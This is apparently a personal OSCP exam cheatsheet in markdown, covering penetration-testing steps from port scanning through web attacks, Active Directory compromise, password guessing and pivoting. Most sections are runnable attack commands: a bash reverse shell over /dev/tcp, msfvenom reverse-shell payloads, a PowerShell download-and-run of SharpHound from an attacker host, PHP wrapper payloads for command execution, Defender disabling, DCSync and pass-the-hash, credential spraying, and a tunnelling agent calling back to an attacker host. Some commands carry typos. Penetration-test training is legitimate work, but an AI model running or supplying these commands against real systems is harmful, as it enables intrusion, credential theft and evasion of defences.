# OSCP Cheatsheet
Your content here
## Formatting Requirements
- Capitalization and underscores (`File_Name.txt`)
- `host.domain.tld` preferred (e.g., Kerberos) over `#.#.#.#` unless required. Or `attack.domain.tld` where necessary.
- Keep any variables to be modified to the left in a command (to enable faster CLI modification)
- Prefer single quotes
- Single quote usernames (Unquoted `PC$` would break the command)
- Quote all paths
- Use `$HtB` and `$Tools` paths (set in `~/.zshrc`)
- Only add `sudo` if actually required
- Specify `tun0` whenever possible to prevent adapter issues from arising

## General Resources
- https://ippsec.rock

## Port/OS Discovery
```
nmap -Pn -p- host.domain.tld -v -T3
sudo masscan -p1-65535,U:1-65535 --rate=500 -e tun0 #.#.#.#
```
1. Paste results into Sublime and enable regex
2. Move UDP to the top of the page
3. Find `^.*rt `, Find All, backspace
4. Find `/.*$`, Find All, backspace
5. Find `\n`, Find All, backspace, enter `n`, Delete key
```
nmap host.domain.tld -p 22,80 -Pn -sC -sV --open -e tun0 -oA '.\nmap_TCP_Initial'
```
```
sudo nmap host.domain.tld -p 53,135 -Pn -sC -sV --open -e tun0 -sU -oA '.\nmap_UDP_Initial'
```
```
ping host.domain.tld
```
- TTL 254 = Cisco default
- TTL 127 = Windows default
- TTL 64  = Linux default
## Web Application Security
Your content here
- File/Directory Enumeration
- Virtual Host Enumeration
- View Source Code / Inspect Console
- Directory Traversal
- Directory Listing
- Patch checks
- Password Guessing
- 403 forbidden bypass
- SQL Injection
- LFI/RFI
- User enumeration

Resources:
- https://github.com/riramar/Web-Attack-Cheat-Sheet

### File/Directory Enumeration
**Outer-URL**
Remove `asp`/`aspx` for Linux hosts
- https://epi052.github.io/feroxbuster-docs/docs/configuration/command-line/
- `-f` can cause a ton of false positives
- `-n` stops recursive directory lookups
- `-b` searches for backups; can produce false positives
```
feroxbuster -u http://host.domain.tld:80/ -f -n -C 404 -A -e -S 0 -B --auto-tune --burp-replay
feroxbuster -u http://host.domain.tld:80/ -f -n -C 404 -A -e -S 0 -B --auto-tune --burp-replay --dont-scan Css Js css img js IMG JS Img CSS fonts Fonts master
feroxbuster -u http://host.domain.tld:80/ -x asp,aspx,html,php,xml,json,txt -C 404 -A -e -S 0 -B --auto-tune --burp-replay
feroxbuster -u http://host.domain.tld/cgi-bin:80/ -x cgi,pl,py,sh -C 404 -A -e -S 0 -B --auto-tune --burp-replay
feroxbuster -u http://host.domain.tld:80/ -C 404 -A -e -S 0 --wordlist '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt' -B --auto-tune --burp-replay
feroxbuster -u http://host.domain.tld:80/ -x html,php -C 404 -A -e -S 0 --wordlist '/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt' -B --auto-tune --burp-replay
```
**Inner-URL**

Such as APIs `v1`, `v2`, etc.
```
ffuf -u 'http://host.domain.tld/FUZZ/v1' -w '/usr/share/wordlists/dirb/big.txt' -r http://127.0.0.1:8080
```
### Virtual Host (subdomain) Enumeration
```
gobuster vhost -u host.domain.tld -w '/usr/share/wordlists/amass/subdomains-top1mil-5000.txt' -t 50 --append-domain 
```
### Parameter Mining
- https://github.com/s0md3v/Arjun

```
arjun -u 'http://host.domain.tld?id=1'
```
```
arjun -u 'http://host.domain.tld?id=1' --stable
```
### Directory Traversal
- https://github.com/jcesarstef/dotdotslash
- `/etc/passwd` (readable by all users)
- `/var/www/html` (Apache2)
- `\windows\win.ini` (readable by all users) (slashes don't necessarily matter)
- `C:\inetpub\wwwroot`
- ?param=phpinfo();
- https://gist.github.com/jonlabelle/3f9aa4a5f3a2e41b7b4a81232047435c
- Modify `match.py` to meet the needs (OS, `file://`, etc.)
```
python "$Tools/dotdotslash/dotdotslash.py" --url 'http://host.domain.tld/bWAPP/directory_traversal_1.php?page=/etc/passwd' --string 'etc/passwd' -v --depth 12 --cookie 'PHPSESSID=<ID>; security_level=3'
```
### Vulnerability Scanning
- https://github.com/sullo/nikto

```
nikto -host='http://host.domain.tld'
```
### SQL Injection
- Check to see if the form/input actually goes anywhere (isn't fake)
- https://portswigger.net/web-security/sql-injection/cheat-sheet
### Bypass 403
- https://github.com/iamj0ker/bypass-403

```
bash "$Tools/bypass-403/bypass-403.sh" host.domain.tld index.html
```
### User Enumeration
Locations:
- Static site content
People:
- Customers
- Team members
### Sensitive Information
```
curl 'http://host/domain.tld/index.html' | grep -oE '\w+' | sort -u -f | more
cewl -u 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' http://host.domain.tld --depth 5 -a --with-numbers -m 6 --exclude './cewl_Exclude.txt'
```
### IIS
**WebDAV**
```
nmap host.domain.tld -p 80 -Pn --script http-iis-webdav-vuln -e tun0
```
### XSS
- Common characters to check for sanitization: `< > ' " { } ;-#=TICK/\`
- https://jscompress.com/*
- Check to see if the form/input actually goes anywhere (isn't fake)
### PHP Wrappers
Search if `<body>` or `<html>` is not closed

**Read**
```
http://host.domain.tld/index.php?page=php://filter/resource=db.php
http://host.domain.tld/index.php?page=php://filter/convert.base64-encode/resource=db.php
```
**Execute**
- URL encoding and base64 will usually be required
```
http://host.domain.tld/index.php?page=data://text/plain,<?php echo system($_GET["ls"]);?>
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
http://host.domain.tld/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
```
### File Uploads
- `/uploads` directory usually
- php, phps, php7, pHp
- Attempt to upload the same file twice  l
### Code Injection
Check if CMD or PowerShell
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```
## Linux/UNIX Security
Your content here
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- https://pentestmonkey.net/tools/audit/unix-privesc-check
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- https://security.stackexchange.com/questions/252665/does-john-the-ripper-not-support-yescrypt
- https://gtfobins.github.io/
```
sudo -l
getcap -r / 2>/dev/null
su - root
su - root '/bin/Web-Attack-Cheat-Sheet'
find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null
```
Obtain Real Shell (TTY/etc.)
```
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo
fg
reset
xterm-color
```
### MySQL
```
nmap host.domain.tld -p 3306 -Pn --script mysql-*
mysql -u 'User' -p'Password123!' -h host.domain.tld
```
## Windows and AD Security
Your content here
- https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg
- https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
- https://www.ultimatewindowssecurity.com/blog/default.aspx?p=c2bacbe0-d4fc-4876-b6a3-1995d653f32a
- https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49
- https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md
- **PowerView requires all capital LDAP distinguished names**
### Anonymous
Your content here
#### DNS
- `-tcp` if needed
```
dnsrecon -n #.#.#.# -d domain.tld -a -x './dnsrecon.xml' -c './dnsrecon.csv'
```
#### LDAP(S)
- https://github.com/CroweCybersecurity/ad-ldap-enum
- Can still pull partial info if ^ fails: https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
- https://github.com/garrettfoster13/pre2k-TS
- LDAP insensitive terms (`grep -i 'pattern' 'File.txt'`): password, pwd, secret
```
python "$Tools/ad-ldap-enum/ad-ldap-enum.py" -l host.domain.tld -d domain.tld -n -o 'ad-ldap-enum_Anon_'
openssl s_client host.domain.tld:636
ldapsearch -h host.domain.tld -x -b "DC=domain,DC=tld" > './ldapsearch_anon.txt'
ldapsearch -h host.domain.tld -x -b "DC=domain,DC=tld" '(objectClass=person)' > './ldapsearch_anon_person.txt'
cat './ldapsearch_anon.txt' \ awk '{print #1}' | sort | uniq -c | sort -n
cat './ldapsearch_anon.txt' \ awk '{print #1}' | sort | uniq -c | sort -n | grep ':'
python "$Tools/LdapRelayScan/LdapRelayScan.py" -dc-ip #.#.#.# -method LDAPS
```
#### RPC
- https://github.com/cddmp/enum4linux-ng
- https://www.hackingarticles.in/active-directory-enumeration-rpcclient/
- https://github.com/p0dalirius/Coercer
```
python "$Tools/enum4linux-ng/enum4linux-ng.py" -C host.domain.tld -A -R -Gm -oA "$OSCP/##/enum4linux-ng_Anon"
grep 'username\:.*' 'enum4linux-ng_Anon.yaml' | cut -d : -f 2 > 'Domain_Users.txt'
```
```
impacket-rpcdump host.domain.tld
ridenum host.domain.tld 500 50000
rpcclient host.domain.tld -U '' -N
rpcclient host.domain.tld -U 'User' -N
rpcclient host.domain.tld -U 'Guest' -N
```
```
sudo responder -I tun0 -A --lm
sudo responder -I tun0 -A
python "$Tools/PetitPotam/PetitPotam.py" attack.domain.tld host.domain.tld -pipe all
python "$Tools/PetitPotam/PetitPotam.py" attack@80/index.html host.domain.tld -pipe all
python "$Tools/PetitPotam/PetitPotam.py" attack.domain.tld@80/index.html host.domain.tld -pipe all
```
#### SMB
- https://github.com/crowecybersecurity/shareenum
```
nmap host.domain.tld --script smb-vuln* -p 137,139,445 -Pn -e tun0 -oA './nmap_smb_vuln'
smbclient -L ////host.domain.tld -U '' -N
smbclient -L ////host.domain.tld -U 'User' -N
smbclient -L ////host.domain.tld -U 'Guest' -N
smbclient '//host.domain.tld/Share' -U '' -N
smbclient '//host.domain.tld/Share' -U 'User' -N
smbclient '//host.domain.tld/Share' -U 'Guest' -N
"$Tools/shareenum/src/shareenum" host.domain.tld -o './shareenum_Anon.csv'
"$Tools/shareenum/src/shareenum" "$OSCP/IPs.txt" -o './shareenum_Anon.csv'
impacket-Get-GPPPassword domain.tld/@host.domain.tld
```
smbclient, pull all files in share:
```
mask ''
recurse ON
prompt OFF
mget *
```
#### Kerberos
- https://github.com/ropnop/kerbrute
```
"$Tools/kerbrute_linux_amd64" userenum --dc host.domain.tld -d domain.tld 'Domain_Users.txt' -o 'kerbrute_Results.txt'
sudo ntpdate host.domain.tld
impacket-GetNPUsers domain.tld/ -usersfile 'Domain_Users.txt' -outputfile 'Impacket_ASREPRoast_Anon.txt'
```
#### Microsoft SQL
```
nmap host.domain.tld -Pn -p 1433 --script ms-sql-info,ms-sql-ntlm-info -e tun0 -oA 'nmap_mssql'
```
#### SMTP
```
nmap host.domain.tld --script smtp-vuln-* -p 25 -Pn -e tun0 -oA 'nmap_smtp_vuln'
```
#### Patch Management
Don't expect a patch to be missing in the real world, but we're in the fake world:
- [EternalBlue](https://github.com/3ndG4me/AutoBlue-MS17-010)
- [PrintNightmare](https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527)
- [NoMIC](https://github.com/fox-it/cve-2019-1040-scanner)
- [ZeroLogon](https://github.com/dirkjanm/CVE-2020-1472)
- [SIGRed](https://github.com/chompie1337/SIGRed_RCE_PoC)
- [NoPAC](https://github.com/Ridter/noPac)
- [PrivExchange](https://github.com/dirkjanm/PrivExchange)
- [ShellShock](https://github.com/b4keSn4ke/CVE-2014-6271)
```
python "$Tools/AutoBlue/eternal_checker.py" host.domain.tld
```
```
python "$Tools/Shellshock-CVE-2014-6271/shellshock.py" #.#.#.# #### 'http://host.domain.tld/cgi-bin/<vulnerable-script>'
```
### Authenticated
Your content here
#### SMB
- [LnkBomb](https://github.com/dievus/lnkbomb)
- [MAN-SPIDER](https://github.com/blacklanternsecurity/MANSPIDER)
```
"$Tools/shareenum/src/shareenum" host.domain.tld -u 'Domain\User' -p 'Password123!' -o './shareenum_Auth.csv'
"$Tools/shareenum/src/shareenum" "$OSCP/IPs.txt" -u 'Domain\User' -p 'Password123!' -o './shareenum_Auth.csv'
smbclient -L ////host.domain.tld -U 'User' --password 'Password123!'
smbclient '//host.domain.tld/Share' -U 'User' --password 'Password123!'
smbmap -H host.domain.tld -u 'User' -p 'Password123!' -d domain.tld -R
crackmapexec smb host.domain.tld -u 'User' -p 'Password123!' -d domain.tld --shares
impacket-Get-GPPPassword domain.tld/'User':'Password123!'@host.domain.tld
sudo mount -t cifs -o 'username=User,password=Password123!,domain=domain.tld' '//host.domain.tld/share' '/mnt/share'
virtualenv > python -m manspider '/mnt/share' -u 'Joe' -p 'Password123!' -d domain.tld -c password
```
#### LDAP(S)
- https://github.com/CroweCybersecurity/ad-ldap-enum
- https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/
```
python "$Tools/ad-ldap-enum/ad-ldap-enum.py" -l host.domain.tld -d domain.tld -u 'User' -p 'Password123!' -o 'ad-ldap-enum_Auth_'
python "$Tools/LdapRelayScan/LdapRelayScan.py" -u 'User' -p 'Password123!' -dc-ip #.#.#.# -method BOTH
```
#### Kerberos
```
impacket-GetNPUsers domain.tld/'User':'Password123!' -outputfile 'Impacket_ASREPRoast_Auth.txt' -dc-ip host.domain.tld
impacket-GetUserSPNs domain.tld/'User':'Password123!' -dc-ip host.domain.tld -outputfile 'Impacket_Kerberoast.txt' -Request -dc-ip host.domain.tld
```
#### HTTP
```
webclientservicescanner domain.tld/'User':'Password123!'@"$OSCP/IPs-Window.txt" -dc-ip host.domain.tld
```
#### Microsoft SQL
- DBeaver: Fix theme colors: Window > Preferences> General > Appearance > Theme
- [MSDAT - Known to have an xp_dirtree problem ](https://github.com/quentinhardy/msdat/issues/14)
```
patator mssql_login host=host.domain.tld user='User' password='Password123!' windows_auth=0 --max-retries=0 --csv='mssql_single.csv'
impacket-mssqlclient 'User':'Password123!'@host.domain.tld
python "$Tools/msdat/msdat.py" all -s host.domain.tld -U 'User' -P 'Password123!'
& "C:\Program Files\Microsoft SQL Server/Client SDK/ODBC/170/Tools/Binn/SQLCMD.EXE" -S HOST\SQLEXPRESS -U 'sa' -P 'Password123!' -q "select DB_NAME()"
```
#### PSRemoting / WinRM
```
$P = 'PS_Credential_Hash' | ConvertTo-SecureString
$P = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object -Typename System.Management.Automation.PSCredential('domain.tld\User', $P)
$Cred.GetNetworkCredential() | Format-List
Invoke-Command -Computername host.domain.tld -ScriptBlock { Get-ChildItem '$env:homedrive\Users\User\Desktop' } -Credential $Cred
```
```
evil-winrm -u 'User' -p 'Password123!' -i host.domain.tld
evil-winrm -u 'User' -H '31d6cfe0d16ae931b73c59d7e0c089c0' -i host.domain.tld
upload "$Tools/ligolo/ligolo-ng_agent_0.4.3_Windows_64bit.zip"
upload "$Tools/mimikatz_x64/mimikatz.exe"
upload "$Tools/winPEAS.exe"
download 'file.exe'
gci -hidden ./
```
```
impacket-psexec domain.tld/'User'@host.domain.tld -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
impacket-wmiexec domain.tld/'User':'Password123!'@host.domain.tld
```
#### Lay-of-the-Land
```
whoami /all
Get-MpComputerStatus
Set-MpPreference -DisableRealtimeMonitoring $true
wmic os get osarchitecture
```
#### Certificate Services
- https://github.com/zer1t0/certi
- https://github.com/ly4k/Certipy
- https://github.com/GhostPack/Certify

**ESC1**
```
./Certify.exe cas /quiet
./Certify.exe find /quiet /vulnerable /currentuser
./Certify.exe request /ca:'host.domain.tld\CA' /template:'Template' /altname:'User' /quiet
```
Copy both private key and certificate into cert.pem and then:
```
openssl pkcs12 -in 'Cert.pem' -keyex -CSP 'Microsoft Enhanced Cryptographic Provider v1.0' -export -out 'Cert.pfx'
```
- https://github.com/fortalice/modifyCertTemplate
- https://github.com/GhostPack/Rubeus
```
Rubeus.exe asktgt /user:'User' /certificate:'.\Cert.pfx' /getcredentials
```
- https://github.com/dirkjanm/PKINITtools
- https://github.com/AlmondOffSec/PassTheCert

#### BloodHound
- https://github.com/hausec/Bloodhound-Custom-Queries
- `~/.config/bloodhound/<queries-file>`
```
iex(New-Object Net.WebClient).downloadString('http://#.#.#.#/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All
dir "C:\program files\MSBuild\MIcrosoft\Windows Workflow Foundation\
```
```
python -m bloodhound -c All -d domain.tld -u 'User' -p 'Password123! -ns #.#.#.#
```
- Look for odd stuff (the path) (mark as high-value)
- Domain Users <> Domain Computers and to each other
```
sudo apt install neo4j=5.2.0+really4.4.16-0kali1 # Neo4j v5.X has bad performance issues
https://bloodhound.readthedocs.io/en/latest/installation/linux.html
sudo neo4j console
"$Tools/BloodHound-linux-x64/BloodHound" --no-sandbox
```
#### DACL Exploitation
Your content here
- https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html
**ForceChangePassword**
- Make sure the password complexity requirement is met, and the username is not within the password
```
rpcclient host.domain.tld -U 'User' --password 'Password123!' 
setuserinfo2 'User' 23 'Password123!'
```
**GenericAll/Write/Owner/FullControl**
- https://github.com/fortra/impacket/pull/1291
```
python "$Tools/impacket-dacledit/examples/dacledit.py" domain.tld/'User':'Password123!' -dc-ip host.domain.tld -principal 'User' -target 'Victim' -action read -debug
```
#### DCSync
- https://github.com/skelsec/pypykatz
- SAM and NTDS administrator passwords can be mismatched
- Computers rotate their passwords at maximum of 30 days
```
impacket-secretsdump domain.tld/'User':'Password123!'@host.domain.tld
```
## Password Guessing
Your content here
### HTTP(S)
```
hydra -l 'User' -P rockyou-50.txt host.domain.tld http-post-form "/site/login.php:<requestuser=^USER^&pass=^PASS^>:<failure string>"
```
### SMB
- `grep -v 'FAILURE' 'smb_user_pass.csv'`
- `find ./ -name ssh 2>/dev/null`
- `grep -E -o ".{0,5}password.{0,5}" -iR ./ 2>/dev/null`
```
patator smb_login host=host.domain.tld user='User' password='Password123!' domain=domain.tld port=445 --max-retries=0 --csv='patator_smb_single.csv'
```
```
patator smb_login host=host.domain.tld password='Password123!' user=FILE0 port=445 0='/usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt' --max-retries=0 --csv='patator_smb_user.csv'
```
```
patator smb_login host=host.domain.tld user='User' domain=domain.tld password=FILE0 port=445 0='/usr/share/wordlists/rockyou.txt' --max-retries=0 --csv='patator_smb_pass.csv'
```
```
patator smb_login host=host.domain.tld domain=domain.tld user=FILE0 password=FILE1 port=445 0='Domain_Users.txt' 1='/usr/share/wordlists/rockyou.txt' --max-retries=0 --csv='patator_smb_user_pass.csv'
```
```
patator smb_login host=host.domain.tld domain=domain.tld user=FILE0 password=FILE1 port=445 0='Domain_Users.txt' 1='Domain_Users.txt' --max-retries=0 --csv='patator_smb_domain_user.csv'
```
```
patator smb_login host=host.domain.tld domain=domain.tld user=FILE0 password='' port=445 0='Domain_Users.txt' --max-retries=0 --csv='patator_smb_domain_null.csv'
```
### SSH
```
patator ssh_login host=host.domain.tld user='User' password='Password123!' port=22 --max-retries=0 --csv='patator_ssh_single.csv'
patator ssh_login host=host.domain.tld password='Password123!' port=22 user=FILE0 0='/usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt' --max-retries=0 --csv='patator_ssh_user.csv'
patator ssh_login host=host.domain.tld user='User' port=22 password=FILE0 0='/usr/share/wordlists/rockyou.txt' --max-retries=0 --csv='ssh_pass.csv'
sudo hydra -l 'User' -P '/usr/share/wordlists/rockyou.txt' -s 22 ssh://host.domain.tld
```
### SMTP
```
"$Tools/GoMapEnum" userenum smtp -t host.domain.tld -d domain.tld -u '/usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt'
```
- Any external emails are false positives as the mail server cannot verify external domains
### SNMPv1/2
```
onesixtyone host.domain.tld -c '/usr/share/wordlists/metasploit/snmp_default_pass.txt'
```
### OpenVPN
```
crowbar -b openvpn -s host.domain.tld -p 1194 -u 'User' -m server.conf -C '/usr/share/john/password.lst'
```
## Data Concealment
NameThatHash (nth)
- https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-and-cracking-mscash-cached-domain-credentials
**LM**
```
hashcat -m 3000 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_LM.txt'
```
**NTLM**
```
hashcat -m 1000 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_NTLM.txt'
```
**DCC2**
```
hashcat -m 2100 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_DCC2.txt'
```
**NetNTLMv2**
```
hashcat -m 5600 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_NTLMv2.txt'
```
**ASREPRoast - RC4**
```
hashcat -m 18200 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_ASREPRoast_RC4.txt'
```
**Kerberoast - RC4**
```
hashcat -m 13100 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_Kerberoast_RC4.txt'
```
**MD5**
```
hashcat -m 0 'Input.txt' '/usr/share/wordlists/rockyou.txt' -o 'Hashcat_MD5.txt'
```
Wordlist Generation w/ Rules
```
hashcat --force './Hashcat_PW_Input.txt' -r '/usr/share/hashcat/rules/best64.rule' --stdout > 'Hashcat_PW_Output_Dupped.txt'
sort -u 'Hashcat_PW_Output_Dupped.txt' 'Hashcat_PW_Output_Unique.txt'
```
**Encrypted Zip**
```
zip2john 'File.zip' > 'John_Zip_Hash.txt'
john --wordlist='/usr/share/wordlists/rockyou.txt' 'John_Zip_Hash.txt'
```

**Base64 String Decode**
- https://gchq.github.io/CyberChef/
```
echo 'acd==' | base64 -d
```
**File Metadata/String**
```
file file.exe
exiftool file.exe
strings file.exe | less
```
## Malware/Exploits
- Word > Insert > Quick Parts > Field > Links and References > Include picture > http://#.#.#.#/canary.jpg
	- Works on WordPad and Office (licensing problems)
### Reverse Shells
- https://www.revshells.com/
```
msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f hta-psh LHOST=#.#.#.# LPORT=9000 > 'reverse64bit.hta'
msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f dll LHOST=#.#.#.# LPORT=9000 > 'reverse64bit.dll'
sudo nc -nlvp 9000
"bash -c 'bash -i >& /dev/tcp/#.#.#.#/#### 0>&1'"
```
### Web Shells
```
/usr/share/webshells
```
### Exploit
- https://www.exploit-db.com/
```
searchsploit term
cp /usr/share/exploitdb/exploits/<path> ./
```
## Attacker Local
Your content here
### Python
**Python Virtual Environment (pyenv)**
```
pyenv virtualenv system/3.X pyenv-venv-tool
pyenv global pyenv-venv-tool
exec $SHELL
pyenv versions
# Never use sudo
pyenv virtualenv-delete pyenv-venv-tool
```
**Install pyproject.toml**
```
pip install -e .
```
**Change Python Versions**
- https://github.com/pyenv/pyenv

```
pyenv versions
pyenv global #.#
exec $SHELL
```
**Python 2.7 Pip Install**
```
curl 'https://bootstrap.pypa.io/pip/2.7/get-pip.py' --output 'get-pip.py'
python2 './get-pip.py'
```
### Script Debugging
**Python 2.7**
```
import pdb
pdb.set_trace()
```
After running the code, execute debugging commands during the debug break:
```
print var
```
**requests Library**
- https://www.th3r3p0.com/random/python-requests-and-burp-suite.html
### Firefox Customization
Extensions
- https://addons.mozilla.org/en-US/firefox/addon/burp-proxy-toggler-lite/
- https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
- https://addons.mozilla.org/en-US/firefox/addon/darkreader/
- https://addons.mozilla.org/en-US/firefox/addon/markdown-viewer-chrome/
- https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
### Add Source
The following method avoids the `apt-key` deprecation warning:
```
wget -qO - 'https://domain.tld/software.pgp.key' | sudo gpg --dearmor -o '/etc/apt/trusted.gpg.d/software.gpg'
echo 'deb https://domain.tld stable latest' > '/etc/apt/sources.list.d/software.list'
sudo apt update
sudo apt update
apt-cache policy
```
## Host Servers
```
python2 -m SimpleHTTPServer 80
python3 -m http.server 80
impacket-smbserver share './'' -smb2support -debug
```
## Connections
**RDP**
```
xfreerdp /u:'User' /p:'Password123!' /v:host.domain.tld:3389
xfreerdp /u:'domain.tld\User' /p:'Password123!' /v:host.domain.tld:3389
```
**SCP**
```
scp 'local-file.txt' User@host.domain.tld:'/home/user'
```
**Dynamic Port Forwarding**
https://github.com/nicocha30/ligolo-ng
```
$ sudo ip tuntap add user kali mode tun ligolo
$ sudo ip link set ligolo up
$ ip address show
$ wget 'https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz'
$ tar -xvf './ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz'
$ screen -R ligolo
$ "$Tools/ligolo/proxy" -selfcert
>> session
>> # enter to select the session
>> ifconfig # to find the inaccessible network
$ sudo ip route add #.#.#.#/## dev ligolo
>> start
$ sudo ip link delete ligolo
```
```
$ evil-winrm -i host.domain.tld -u 'User' -H '31d6cfe0d16ae931b73c59d7e0c089c0'
PS: Set-MpPreference -DisableRealtimeMonitoring $true
$ upload '<Full-Path>/ligolo/ligolo-ng_agent_0.4.3_Windows_64bit.zip'
PS: cd "ligolo-ng_agent_0.4.3_Windows_64bit"
PS: "./agent.exe" -connect attacker.domain.tld:11601 -ignore-cert
Fails: Start-Job -ScriptBlock {& "ligolo-ng_agent_0.4.3_Windows_64bit/agent.exe" -connect 192.168.45.242:11601 -ignore-cert }
```